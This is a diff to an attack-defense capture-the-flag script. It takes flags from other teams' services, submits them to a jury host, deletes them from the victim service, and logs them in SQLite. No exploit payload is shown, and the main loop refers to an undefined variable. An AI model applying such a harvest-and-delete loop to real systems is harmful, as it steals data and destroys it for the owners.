@@ -46,14 +46,41 @@ import sys
 import json
 import time
 import traceback
+import sqlite3
 import requests
 
 if len(sys.argv) < 2:
-    sys.exit("Expected parameter <jury_host> like 10.10.100.101:8080")
+    print("""
+    Usage:
+        """ + sys.argv[0] + """ <jury_host> <optional_team_id>
+    Examples:
+        `""" + sys.argv[0] + """ 10.10.100.100:80`
+        `""" + sys.argv[0] + """ 10.10.100.100:80 t01`
+    """)
+    sys.exit(-1)
 
 JURY_HOST = sys.argv[1]
+HARDCODED_TEAM_ID = None
+if len(sys.argv) > 2:
+    HARDCODED_TEAM_ID = sys.argv[2]
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 FLAGS_DIR = os.path.join(SCRIPT_DIR, 'flags')
+
+with sqlite3.connect("flags/flags.db") as conn:
+    # Create a cursor object to execute SQL commands
+    cursor = conn.cursor()
+
+    # 2. Create a Table
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS flags (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            flag_id TEXT NOT NULL,
+            flag_value TEXT UNIQUE NOT NULL,
+            flag_response TEXT NOT NULL,
+            victim_ip TEXT NOT NULL
+        )
+    """)
+    cursor.execute("CREATE UNIQUE INDEX IF NOT EXISTS index_flag ON flags (flag_id, flag_value);")
 
 
 def get_my_ip():
@@ -211,27 +238,32 @@ def start_exploit(your_team_num, ip_address, port):
     # print("Start attack to (" + ip_address + ":" + str(port) + ")")
     flag_ids = get_list_flag_ids(ip_address, port)
 
-    prev_flags = {}
     if not os.path.isdir(FLAGS_DIR):
         os.mkdir(FLAGS_DIR)
-    filename = os.path.join(FLAGS_DIR, "found_flags.json")
-    if os.path.isfile(filename):
-        with open(filename, "r") as _file:
-            prev_flags = json.load(_file)
+    with sqlite3.connect("flags/flags.db") as conn:
+        # Create a cursor object to execute SQL commands
+        cursor = conn.cursor()
 
-    for flag_id in flag_ids:
-        flag = get_flag(ip_address, port, flag_id)
-        if flag in prev_flags:
-            continue
-        print(flag_id + ": " + flag)
-        if flag != '':
-            ret = send_flag(your_team_num, flag)
-            if ret is not None:
-                prev_flags[flag] = ret
-                delete_flag(ip_address, port, flag_id)
+        for flag_id in flag_ids:
+            flag = get_flag(ip_address, port, flag_id)
+            cursor.execute("SELECT COUNT(*) as cnt FROM flags WHERE flag_value = ?", (flag,))
+            rows = cursor.fetchall()
+            count_flags = rows[0][0]
+            if count_flags == 1:
+                continue  # skip
+            if count_flags > 1:
+                sys.exit("Duplicated flag value found O_o (" + ip_address + ")")
 
-    with open(filename, 'w', encoding='utf-8') as _file:
-        json.dump(prev_flags, _file, ensure_ascii=False, indent=4)
+            print(flag_id + ": " + flag)
+            if flag != '':
+                ret = send_flag(your_team_num, flag)
+                if ret is not None:
+                    cursor.execute(
+                        "INSERT INTO flags(flag_id, flag_value, flag_response, victim_ip) "
+                        " VALUES (?,?,?,?)",
+                        (flag_id, flag, ret, ip_address,)
+                    )
+                    delete_flag(ip_address, port, flag_id)
 
 
 SERVICES_PORTS = {
@@ -243,13 +275,8 @@ SERVICES_PORTS = {
     'service6': 4106,
 }
 
-while True:
-    # print("get list of teams")
-    teams = get_teams()
-    if teams is None:
-        time.sleep(5)
-        continue
 
+def get_my_team_id(teams):
     my_ip = get_my_ip()
     SUBNETWORK = ".".join(my_ip.split(".")[:-1]) + "."
     # print("my ip = ", my_ip)
@@ -272,11 +299,27 @@ while True:
                 FOUND_TEAM = team
 
     if not FOUND_TEAM:
-        print("ERROR: Could not detect team number - please hardcode (" + my_ip + ")")
+        print("ERROR: Could not detect team number - please hardcode (your ip: " + my_ip + ")")
+        return None
+    return FOUND_TEAM['id']
+
+
+while True:
+    # print("get list of teams")
+    teams = get_teams()
+    if teams is None:
         time.sleep(5)
         continue
 
-    my_team_id = FOUND_TEAM['id']
+    if HARDCODED_TEAM_ID is not None:
+        my_team_id = HARDCODED_TEAM_ID
+    else:
+        my_team_id = get_my_team_id(teams)
+
+    if my_team_id is None:
+        print("ERROR: Could not detect team number - please hardcode (your ip: " + my_ip + ")")
+        time.sleep(5)
+        continue
 
     # print("your team is " + my_team_id)
     scoreboard = get_scoreboard()
